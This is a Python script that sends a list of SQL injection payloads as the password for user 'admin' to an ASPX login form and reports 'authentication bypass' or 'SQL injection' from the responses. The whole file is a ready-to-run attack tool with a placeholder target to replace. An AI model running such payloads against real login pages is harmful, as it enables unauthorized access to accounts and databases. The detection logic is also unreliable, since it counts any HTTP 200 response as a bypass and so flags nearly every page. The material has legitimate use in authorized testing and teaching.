import requests


payloads = [
    "' OR '1'='1",
    "' OR 1=1 --",
    "' OR 'a'='a",
    "' OR '1'='1' --",
    "' OR 1=1#",
    "' OR 1=1/*",
    "admin' --",
    "' OR '1'='1'/*",
    "' OR 1=1 LIMIT 1 --",
    "' OR '1'='1' #",
    "' OR '1'='1'/*",
    "' OR 1=1 --",
    "' UNION SELECT NULL, NULL--",
    "admin' #",
    "' OR ''='",
    "' OR 'x'='x';--",
]


url = "http://example.com/login.aspx"  # Replace with the actual ASPX URL


form_data = {
    "username": "admin",  #  username field
    "password": "",       #  password field
}


headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
}

def check_auth_bypass(url, form_data):
    for payload in payloads:
        form_data['password'] = payload
        response = requests.post(url, data=form_data, headers=headers)

        
        if "Welcome" in response.text or response.status_code == 200:
            print(f"Potential Authentication Bypass Found with payload: {payload}")
            print(f"Payload: {payload}")
            print(f"Response Code: {response.status_code}")
            return True

        
        if any(error in response.text for error in [
            "You have an error in your SQL syntax",
            "Warning: mysql_fetch",
            "Unclosed quotation mark",
            "quoted string not properly terminated",
            "Microsoft OLE DB Provider for SQL Server",
            "Incorrect syntax near",
        ]):
            print(f"Potential SQL Injection Found with payload: {payload}")
            print(f"Payload: {payload}")
            print(f"Response Code: {response.status_code}")
            return True

    print("No SQL Injection or Authentication Bypass vulnerabilities found.")
    return False


check_auth_bypass(url, form_data)
